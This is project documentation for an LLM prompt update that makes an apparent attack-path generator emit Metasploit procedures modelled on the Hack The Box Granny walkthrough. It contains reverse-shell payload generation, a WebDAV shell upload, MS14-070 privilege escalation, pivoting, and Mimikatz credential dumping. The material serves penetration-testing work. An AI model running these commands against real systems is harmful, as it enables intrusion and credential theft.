# Prompt Enhancements - Granny.md Integration

## Overview
Updated `app/core/prompts.py` to match the descriptive depth and technical precision demonstrated in `examples/execution/granny.md`.

## Key Improvements

### 1. **Metasploit Framework Procedures**
Enhanced delivery stage with complete Metasploit workflows:
- **Payload generation**: Full msfvenom command syntax with all parameters
- **Handler configuration**: Step-by-step msfconsole setup (including known bugs like setting LHOST twice)
- **Session management**: `sessions -l`, `sessions -i`, `migrate` commands
- **Verification**: `getuid`, `sysinfo` for post-exploitation validation

### 2. **Privilege Escalation Process**
Added complete privilege escalation workflow inspired by Granny example:
- Initial privilege verification (`getuid`)
- Process migration for stability (`ps`, `migrate`)
- Local exploit suggester usage
- Privilege escalation exploit execution (e.g., MS14-070)
- Post-escalation verification

### 3. **Pivoting and Lateral Movement**
Incorporated advanced Metasploit pivoting techniques from Granny→Grandpa pivot:

#### **Method 1: Metasploit Routing**
```bash
route add 10.10.10.14 255.255.255.255 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.14
run
```

#### **Method 2: SOCKS Proxy**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
proxychains nmap -sT -Pn 10.10.10.14
```

#### **Method 3: Port Forwarding**
```bash
portfwd add -l 445 -p 445 -r 10.10.10.14
portfwd list
```

**CRITICAL**: When exploiting through pivot, set `LHOST` to pivot host IP (not attacker IP):
```bash
set RHOST 10.10.10.14   # Target
set LHOST 10.10.10.15   # Pivot host (Granny) - NOT attacker IP
```

### 4. **Post-Exploitation Actions**
Added detailed post-exploitation commands:

#### **Credential Harvesting**
```bash
hashdump   # Dump user hashes
load kiwi   # Load Mimikatz
creds_all   # Dump all credentials
```

#### **System Reconnaissance**
```bash
sysinfo   # System information
ipconfig   # Network configuration
ps   # Process list
netstat   # Active connections
```

#### **File System Operations**
```bash
download flag.txt
upload exploit.exe C:\\Temp\\
```

### 5. **Alternative Delivery Methods**
Documented non-Metasploit approaches:
- **WebDAV exploitation** (IIS 6.0): PUT + MOVE technique
- **File-based delivery**: SMB, FTP, HTTP
- **Phishing**: Malicious documents, social engineering
- **Supply chain**: Repository compromise

### 6. **Important Considerations**
Added operational notes:
- Network connectivity requirements for reverse callbacks
- Firewall rule verification
- Payload encoding for AV evasion
- Staged vs stageless payload selection
- Session migration for stability

## Example Output Expectations

Based on these enhancements, the LLM should now generate responses like:

### Delivery Stage
```
**Step 1 - Generate ASPX payload**:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx > shell.aspx

**Step 2 - Configure handler**:
use exploit/multi/handler
set LHOST 10.10.14.4
set LHOST 10.10.14.4   # Set twice due to known Metasploit bug
set LPORT 1337
set PAYLOAD windows/meterpreter/reverse_tcp
run

**Step 3 - Upload payload via WebDAV**:
PUT /shell.txt HTTP/1.1 (upload as .txt)
MOVE /shell.txt to /shell.aspx (rename to executable)

**Step 4 - Trigger payload**:
curl http://10.10.10.15/shell.aspx

**Step 5 - Verify session**:
sessions -l
sessions -i 1
getuid   # Verify: NT AUTHORITY\NETWORK SERVICE
```

### Privilege Escalation
```
**Current privileges**: NT AUTHORITY\NETWORK SERVICE

**Step 1 - Use local exploit suggester**:
background
use post/multi/recon/local_exploit_suggester
set session 1
run

**Step 2 - Execute MS14-070**:
use exploit/windows/local/ms14_070_tcpip_ioctl
set session 1
run

**Result**: NT AUTHORITY\SYSTEM (elevated privileges obtained)
```

### Pivoting
```
**Configure route to internal target**:
route add 10.10.10.14 255.255.255.255 1

**Exploit through pivot**:
use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath
set RHOST 10.10.10.14   # Internal target
set LHOST 10.10.10.15   # Pivot host (Granny) - callbacks go here
run

**Metasploit forwards session automatically from Granny to attacker**
```

## Testing Recommendations

To verify improvements:

1. **Test with minimal data**: Ensure LLM still generates coherent paths
2. **Test with IIS/WebDAV vulnerabilities**: Should match granny.md detail level
3. **Test with privilege escalation scenarios**: Should include local_exploit_suggester
4. **Test with multi-host scenarios**: Should include pivoting techniques
5. **Validate command syntax**: All commands should be copy-paste executable

## Benefits

✅ **Realistic exploitation workflows** matching real penetration testing  
✅ **Executable commands** that can be directly used  
✅ **Educational value** for understanding Metasploit procedures  
✅ **Consistency** across all generated attack paths  
✅ **Granny.md-level detail** as reference standard  

## Related Files
- **Source**: `/home/pyramid/workspace/reveald/ai-engine/examples/execution/granny.md`
- **Updated**: `/home/pyramid/workspace/reveald/ai-engine/app/core/prompts.py`
- **Documentation**: This file

---
**Last Updated**: 2025-10-24  
**Reference Example**: Granny HTB Walkthrough
